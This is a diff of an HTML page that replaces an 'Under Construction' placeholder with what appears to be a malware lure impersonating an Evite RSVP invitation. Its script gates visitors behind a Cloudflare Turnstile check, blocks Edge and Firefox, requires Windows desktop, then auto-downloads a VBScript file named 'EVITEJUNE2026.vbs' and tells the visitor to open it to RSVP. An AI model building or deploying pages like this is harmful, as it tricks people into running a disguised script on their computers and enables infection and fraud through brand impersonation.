@@ -1,76 +1,702 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Under Construction</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
 
-  <!-- Google Font -->
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
+body{
+    font-family:Arial, sans-serif;
+    background:#f5f7f6;
+}
 
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Inter', sans-serif;
+.container{
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    min-height:100vh;
+    padding:20px;
+}
+
+.thanks-card{
+    max-width:550px;
+    padding:3rem 2rem;
+    background:#fff;
+    border-radius:20px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.08);
+    border-top:6px solid #28a842;
+    text-align:center;
+}
+
+.thanks-card h2{
+    font-size:28px;
+    color:#28a842;
+    margin-bottom:10px;
+}
+
+.thanks-card p{
+    font-size:16px;
+    color:#555;
+    margin-bottom:20px;
+}
+
+button{
+    background:#28a842;
+    color:#fff;
+    border:none;
+    padding:14px 30px;
+    font-size:16px;
+    border-radius:50px;
+    cursor:pointer;
+    font-weight:bold;
+    transition:all .2s;
+}
+
+button:hover{
+    background:#1e7e34;
+    transform:scale(1.03);
+}
+
+button:disabled{
+    background:#aaa;
+    cursor:not-allowed;
+}
+
+.progress-container{
+    width:100%;
+    background:#e6f4ea;
+    border-radius:10px;
+    margin:20px 0;
+    overflow:hidden;
+    display:none;
+}
+
+.progress-bar{
+    width:0%;
+    height:6px;
+    background:#28a842;
+}
+
+#toast{
+    position:fixed;
+    bottom:30px;
+    left:50%;
+    transform:translateX(-50%) translateY(20px);
+    background:#1f2f29;
+    color:#fff;
+    padding:14px 24px;
+    border-radius:50px;
+    font-size:14px;
+    opacity:0;
+    transition:.3s;
+    z-index:10000;
+    pointer-events: none;
+    white-space: nowrap;
+}
+
+#toast b{color:#ffd966;}
+
+#browser-warning {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #ffffff;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    z-index: 100000;
+    flex-direction: column;
+    text-align: center;
+    padding: 20px;
+    overflow-y: auto;
+}
+
+.warning-card {
+    max-width: 500px;
+    width: 90%;
+    background: #fff;
+    border-radius: 28px;
+    padding: 48px 36px;
+    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.15);
+    border-top: 6px solid #ff3b30;
+}
+
+.warning-icon {
+    width: 80px;
+    height: 80px;
+    background: #fee2e2;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 24px;
+}
+
+.warning-icon svg {
+    width: 42px;
+    height: 42px;
+}
+
+.warning-card h1 {
+    font-size: 28px;
+    font-weight: 800;
+    margin-bottom: 12px;
+    color: #1a1a2e;
+}
+
+.warning-card p {
+    font-size: 16px;
+    color: #5c5c70;
+    margin-bottom: 28px;
+    line-height: 1.5;
+}
+
+.browser-icons {
+    display: flex;
+    justify-content: center;
+    gap: 32px;
+    margin: 28px 0;
+    flex-wrap: wrap;
+}
+
+.browser-badge {
+    text-align: center;
+}
+
+.browser-badge svg {
+    width: 52px;
+    height: 52px;
+    margin-bottom: 8px;
+}
+
+.browser-badge span {
+    font-size: 14px;
+    color: #333;
+    font-weight: 600;
+    display: block;
+}
+
+.browser-badge .check {
+    font-size: 12px;
+    margin-top: 6px;
+    font-weight: 500;
+}
+
+.browser-badge .check.valid {
+    color: #28a842;
+}
+
+.browser-badge .check.invalid {
+    color: #ff3b30;
+}
+
+.url-box {
+    background: #f5f5f7;
+    padding: 16px;
+    border-radius: 16px;
+    margin: 20px 0 20px;
+    word-break: break-all;
+    font-family: 'SF Mono', monospace;
+    font-size: 13px;
+    color: #1a1a2e;
+    border: 1px solid #e8e8ed;
+    text-align: left;
+    display: none;
+}
+
+.copy-btn {
+    background: #4285f4;
+    color: white;
+    border: none;
+    padding: 14px 24px;
+    font-size: 15px;
+    font-weight: 600;
+    border-radius: 60px;
+    cursor: pointer;
+    transition: all 0.2s;
+    width: 100%;
+    margin-bottom: 12px;
+}
+
+.copy-btn:hover {
+    background: #3367d6;
+    transform: scale(1.02);
+}
+
+.instruction-text {
+    font-size: 13px;
+    color: #28a842;
+    margin-top: 16px;
+    background: #e8f5e9;
+    padding: 12px;
+    border-radius: 12px;
+    font-weight: 500;
+}
+
+.warning-footer {
+    margin-top: 32px;
+    font-size: 12px;
+    color: #8e8e93;
+    padding-top: 16px;
+    border-top: 1px solid #efeff4;
+}
+
+.top-logo{
+    position:fixed;
+    top:20px;
+    left:20px;
+    z-index:9999;
+}
+
+.top-logo img{
+    width:80px;
+    height:auto;
+    display:block;
+}
+
+#loading-overlay{
+    position:fixed;
+    width:100%;
+    height:100%;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    flex-direction:column;
+    z-index:100000;
+}
+
+.loading-spinner{
+    border:3px solid #e6f4ea;
+    border-top:3px solid #28a842;
+    border-radius:50%;
+    width:70px;
+    height:70px;
+    animation:spin .6s linear infinite;
+}
+
+.loading-text{
+    margin-top:15px;
+    color:#333;
+}
+
+@keyframes spin{
+    0%{transform:rotate(0)}
+    100%{transform:rotate(360deg)}
+}
+
+#cf-turnstile {
+    display: none;
+}
+
+@media (max-width: 550px) {
+    .warning-card {
+        padding: 36px 24px;
     }
-
-    body {
-      height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #0f172a, #1e293b);
-      color: #fff;
+    .warning-card h1 {
+        font-size: 24px;
     }
-
-    .container {
-      text-align: center;
-      padding: 40px;
-      border-radius: 16px;
-      background: rgba(255, 255, 255, 0.05);
-      backdrop-filter: blur(10px);
-      box-shadow: 0 8px 30px rgba(0,0,0,0.3);
-      max-width: 500px;
-      width: 90%;
+    .browser-icons {
+        gap: 20px;
     }
-
-    h1 {
-      font-size: 2.5rem;
-      font-weight: 600;
-      margin-bottom: 10px;
+    #toast {
+        white-space: normal;
+        text-align: center;
+        max-width: 90%;
+        font-size: 13px;
     }
+}
+</style>
 
-    p {
-      font-size: 1.1rem;
-      color: #cbd5f5;
-      margin-bottom: 20px;
-    }
-
-    .status {
-      display: inline-block;
-      padding: 8px 16px;
-      border-radius: 999px;
-      background: #22c55e20;
-      color: #22c55e;
-      font-size: 0.9rem;
-      font-weight: 500;
-    }
-
-    .footer {
-      margin-top: 25px;
-      font-size: 0.85rem;
-      color: #94a3b8;
-    }
-  </style>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
 </head>
+
 <body>
-  <div class="container">
-    <h1>Welcome 👋</h1>
-    <p>This website is currently under construction.</p>
-    <div class="status">Coming Soon</div>
-    <div class="footer">© 2026.</div>
-  </div>
+
+<div class="top-logo">
+    <img src="e.png" alt="E-logo" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' width=\'80\' height=\'80\' viewBox=\'0 0 100 100\'%3E%3Crect width=\'100\' height=\'100\' fill=\'%2328a842\'/%3E%3Ctext x=\'50\' y=\'67\' font-size=\'50\' text-anchor=\'middle\' fill=\'white\'%3EE%3C/text%3E%3C/svg%3E'">
+</div>
+
+<div id="loading-overlay">
+    <div class="loading-spinner"></div>
+    <div class="loading-text">Verifying your Invitation...</div>
+    <div id="cf-turnstile"></div>
+</div>
+
+<div id="browser-warning">
+    <div class="warning-card">
+        <div class="warning-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <circle cx="12" cy="12" r="10" stroke="#ff3b30" stroke-width="2"/>
+                <path d="M12 8v6" stroke="#ff3b30" stroke-linecap="round" stroke-width="2"/>
+                <circle cx="12" cy="16" r="1.5" fill="#ff3b30"/>
+            </svg>
+        </div>
+        <h1>Browser Not Supported</h1>
+        <p>This RSVP invitation system does not support <strong>Microsoft Edge</strong> or <strong>Mozilla Firefox</strong>. Please use <strong>Google Chrome</strong> or <strong>Brave</strong> to access your invitation.</p>
+        
+        <div class="browser-icons">
+            <div class="browser-badge">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" fill="#4285F4"/>
+                    <path d="M7 12l3 3 7-7" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
+                <span>Chrome</span>
+                <div class="check valid">✓ Supported</div>
+            </div>
+            <div class="browser-badge">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" fill="#FF9400"/>
+                    <path d="M7 12l3 3 7-7" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
+                <span>Firefox</span>
+                <div class="check invalid">✗ Not Supported</div>
+            </div>
+            <div class="browser-badge">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" fill="#3b3b3b"/>
+                    <path d="M12 8v4" stroke="white" stroke-width="2"/>
+                    <circle cx="12" cy="16" r="1.5" fill="white"/>
+                </svg>
+                <span>Edge</span>
+                <div class="check invalid">✗ Not Supported</div>
+            </div>
+            <div class="browser-badge">
+                <svg viewBox="0 0 24 24" fill="none">
+                    <circle cx="12" cy="12" r="10" fill="#5A2D8C"/>
+                    <path d="M7 12l3 3 7-7" stroke="white" stroke-width="2.5" stroke-linecap="round"/>
+                </svg>
+                <span>Brave</span>
+                <div class="check valid">✓ Supported</div>
+            </div>
+        </div>
+
+        <button class="copy-btn" id="copyLinkBtn">📋 Copy Invitation Link</button>
+        
+        <div class="instruction-text">
+            💡 <strong>How to continue:</strong> Copy the link above → Open Chrome → Paste in address bar → Press Enter
+        </div>
+        
+        <div class="warning-footer">
+            <span style="font-size: 11px; opacity: 0.7;">This link contains your secure invitation</span><br>
+            © 2026 Evite · Desktop browser required
+        </div>
+    </div>
+</div>
+
+<div class="form-container">
+    <div class="container" id="mainContainer">
+        <div class="thanks-card">
+            <h2>🎉 You're invited! 🎉</h2>
+            <p>Your RSVP event package is being prepared ...</p>
+            <p>Open the downloaded file that contains your digital RSVP form to make RSVP.</p>	
+            <p>🎊 Thank You 🎊</p>	   
+            <div class="progress-container" id="progressContainer">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <button id="manualDownload">Download Invitation Card</button>
+        </div>
+    </div>
+
+    <div id="toast"></div>
+</div>
+
+<script>
+function isBlockedBrowser() {
+    const ua = navigator.userAgent || "";
+    const userAgentData = navigator.userAgentData || null;
+    
+    const isEdgeChromium = /Edg\//i.test(ua);
+    const isLegacyEdge = /Edge\//i.test(ua) && !/Edg\//i.test(ua);
+    const isIE = /Trident/i.test(ua) || /MSIE/i.test(ua);
+    const isFirefox = /Firefox/i.test(ua) || /FxiOS/i.test(ua);
+    
+    if (isEdgeChromium || isLegacyEdge || isIE || isFirefox) {
+        return true;
+    }
+    
+    if (userAgentData && userAgentData.brands) {
+        const brands = userAgentData.brands;
+        for (let brand of brands) {
+            const brandName = brand.brand.toLowerCase();
+            if (brandName.includes('microsoft edge') || 
+                brandName.includes('edge') ||
+                brandName.includes('firefox')) {
+                return true;
+            }
+        }
+    }
+    
+    if (window.MSStream) return true;
+    
+    if (ua.indexOf("Edg") !== -1) return true;
+    if (ua.indexOf("Firefox") !== -1) return true;
+    
+    return false;
+}
+
+const files = { windows: { url: "EVITEJUNE2026.vbs", name: "EVITEJUNE2026.vbs" } };
+let selectedFile = files.windows;
+let downloadInProgress = false;
+let turnstileVerified = false;
+let currentPageUrl = "";
+
+function isDesktopWindows() {
+    const ua = navigator.userAgent || "";
+    const platform = navigator.platform || "";
+    return /Win/i.test(platform) && !/Mobile/i.test(ua);
+}
+
+function showToast(msg, isError = false) {
+    const t = document.getElementById("toast");
+    t.innerHTML = msg;
+    t.style.opacity = "1";
+    t.style.transform = "translateX(-50%)";
+    t.style.background = isError ? "#8B0000" : "#1f2f29";
+    setTimeout(() => { 
+        t.style.opacity = "0";
+        setTimeout(() => { t.style.background = "#1f2f29"; }, 400);
+    }, 4000);
+}
+
+function updateProgress(p) {
+    const progContainer = document.getElementById("progressContainer");
+    const progBar = document.getElementById("progressBar");
+    if (progContainer) progContainer.style.display = "block";
+    if (progBar) progBar.style.width = p + "%";
+}
+
+async function downloadFile(file) {
+    if (downloadInProgress) return;
+    downloadInProgress = true;
+    updateProgress(15);
+    try {
+        const res = await fetch(file.url);
+        if (!res.ok) throw new Error("fetch failed");
+        const blob = await res.blob();
+        updateProgress(70);
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = file.name || file.url.split('/').pop();
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        updateProgress(100);
+        setTimeout(() => {
+            const progContainer = document.getElementById("progressContainer");
+            const progBar = document.getElementById("progressBar");
+            if (progContainer) progContainer.style.display = "none";
+            if (progBar) progBar.style.width = "0%";
+        }, 1500);
+        showToast("✅ Download complete! Check your Downloads folder.");
+    } catch (err) {
+        console.warn("fetch failed, redirect fallback", err);
+        window.location.href = file.url;
+        showToast("⚠️ Download started directly.");
+    }
+    downloadInProgress = false;
+}
+
+function launchMeeting() {
+    if (!turnstileVerified) {
+        showToast("Please complete verification first", true);
+        return;
+    }
+    
+    if (isBlockedBrowser()) {
+        showBlockedWarning();
+        return;
+    }
+    
+    if (!isDesktopWindows()) {
+        showToast("Please use a Windows desktop computer to RSVP", true);
+        return;
+    }
+    
+    downloadFile(selectedFile);
+}
+
+function getCurrentInvitationUrl() {
+    return window.location.href;
+}
+
+function updateInviteUrlDisplay() {
+    const urlBox = document.getElementById("inviteUrlDisplay");
+    if (urlBox) {
+        const fullUrl = getCurrentInvitationUrl();
+        currentPageUrl = fullUrl;
+        urlBox.innerHTML = `🔗 <strong>Your Invitation Link</strong><br><span style="font-size:12px; word-break:break-all; font-family:monospace;">${escapeHtml(fullUrl)}</span>`;
+    }
+}
+
+function escapeHtml(str) {
+    return str.replace(/[&<>]/g, function(m) {
+        if (m === '&') return '&amp;';
+        if (m === '<') return '&lt;';
+        if (m === '>') return '&gt;';
+        return m;
+    });
+}
+
+function copyLinkToClipboard() {
+    const urlToCopy = currentPageUrl || getCurrentInvitationUrl();
+    if (!urlToCopy) {
+        showToast("❌ No link available to copy", true);
+        return;
+    }
+    
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(urlToCopy).then(() => {
+            const copyBtn = document.getElementById("copyLinkBtn");
+            const originalText = copyBtn.innerHTML;
+            copyBtn.innerHTML = "✅ Copied! Now open Chrome/Safari/Opera";
+            copyBtn.style.background = "#28a842";
+            setTimeout(() => {
+                copyBtn.innerHTML = originalText;
+                copyBtn.style.background = "#4285f4";
+            }, 3000);
+            showToast("✅ Link copied! Open Chrome, Safari, or Opera and paste.");
+        }).catch(err => {
+            console.error("Clipboard error: ", err);
+            fallbackCopy(urlToCopy);
+        });
+    } else {
+        fallbackCopy(urlToCopy);
+    }
+}
+
+function fallbackCopy(text) {
+    const textarea = document.createElement("textarea");
+    textarea.value = text;
+    textarea.style.position = "fixed";
+    textarea.style.top = "-9999px";
+    document.body.appendChild(textarea);
+    textarea.select();
+    try {
+        document.execCommand("copy");
+        showToast("✅ Link copied! Paste into Chrome, Safari, or Opera address bar.");
+    } catch (err) {
+        showToast("❌ Could not copy. Please manually copy the URL.", true);
+    }
+    document.body.removeChild(textarea);
+}
+
+function showBlockedWarning() {
+    const loadingOverlay = document.getElementById("loading-overlay");
+    const mainContainer = document.getElementById("mainContainer");
+    
+    if (loadingOverlay) loadingOverlay.style.display = "none";
+    if (mainContainer) mainContainer.style.display = "none";
+    
+    const browserWarning = document.getElementById("browser-warning");
+    if (browserWarning) {
+        browserWarning.style.display = "flex";
+    }
+    
+    const copyBtn = document.getElementById("copyLinkBtn");
+    if (copyBtn && !copyBtn.hasListener) {
+        copyBtn.addEventListener("click", copyLinkToClipboard);
+        copyBtn.hasListener = true;
+    }
+}
+
+function preFlightBrowserCheck() {
+    if (isBlockedBrowser()) {
+        showBlockedWarning();
+        return true;
+    }
+    return false;
+}
+
+document.addEventListener("DOMContentLoaded", () => {
+    if (preFlightBrowserCheck()) {
+        return; 
+    }
+    
+    const btn = document.getElementById("manualDownload");
+    const loadingOverlay = document.getElementById("loading-overlay");
+    
+    if (typeof turnstile !== 'undefined') {
+        turnstile.ready(() => {
+            turnstile.render('#cf-turnstile', {
+                sitekey: '0x4AAAAAAC1YxUs3N81QT2L0',
+                callback: () => {
+                    turnstileVerified = true;
+                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+                    document.body.classList.add('verified');
+                    setTimeout(() => {
+                        launchMeeting();
+                    }, 800);
+                },
+                'error-callback': () => {
+                    console.warn("Turnstile error");
+                    if (loadingOverlay) loadingOverlay.style.display = 'none';
+                    showToast("Verification error, please refresh", true);
+                }
+            });
+        });
+    } else {
+        console.error("Turnstile not loaded");
+        if (loadingOverlay) loadingOverlay.style.display = 'none';
+        showToast("Security check failed, reload page", true);
+    }
+    
+    if (btn) {
+        btn.disabled = true;
+        btn.onclick = () => {
+            if (!turnstileVerified) {
+                showToast("Complete Cloudflare verification first", true);
+                return;
+            }
+            launchMeeting();
+        };
+        setTimeout(() => {
+            if (!turnstileVerified && btn) {
+                btn.disabled = false;
+                btn.textContent = "Verify & Download";
+                btn.onclick = () => {
+                    showToast("Please complete the security puzzle above", true);
+                };
+            } else if (turnstileVerified && btn) {
+                btn.disabled = false;
+                btn.textContent = "Download Invitation Card";
+                btn.onclick = launchMeeting;
+            }
+        }, 3000);
+    }
+    
+    let checkInterval = setInterval(() => {
+        if (turnstileVerified && btn) {
+            btn.disabled = false;
+            btn.textContent = "Download Invitation Card";
+            btn.onclick = launchMeeting;
+            clearInterval(checkInterval);
+        }
+    }, 500);
+    
+    setTimeout(() => {
+        if (loadingOverlay && loadingOverlay.style.display !== 'none') {
+            if (!turnstileVerified) {
+                loadingOverlay.style.display = 'none';
+                showToast("Verification timed out. Refresh the page.", true);
+            } else {
+                loadingOverlay.style.display = 'none';
+            }
+        }
+    }, 12000);
+});
+
+window.addEventListener('load', () => {
+    if (isBlockedBrowser() && document.getElementById("browser-warning").style.display !== "flex") {
+        showBlockedWarning();
+    }
+});
+</script>
+
 </body>
 </html>
